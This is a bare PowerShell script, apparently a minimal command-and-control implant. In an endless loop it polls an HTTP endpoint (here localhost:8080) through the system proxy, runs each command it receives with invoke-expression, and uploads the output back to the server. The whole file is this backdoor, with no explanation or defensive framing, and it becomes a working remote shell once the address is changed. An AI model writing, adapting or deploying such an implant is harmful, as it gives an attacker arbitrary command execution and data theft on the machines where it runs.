while($true)
{

$r = [System.Net.WebRequest]::Create("http://127.0.0.1:8080/fetch")
$r.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$resp = $r.GetResponse()
$reqstream = $resp.GetResponseStream()
$sr = new-object System.IO.StreamReader $reqstream
$result = $sr.ReadToEnd()
write-host $result

  switch ($result) {
    "idle" { 
		# we're asked to standby
		start-sleep -sec 10
    }
	default {
	
		$output = invoke-expression $result | out-string 
		$resp = new-object System.Net.WebClient
		$resp.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
		$resp.UploadString("http://127.0.0.1:8080/response", $output)
	
		start-sleep -sec 10
		
	}
	
  }
  
}
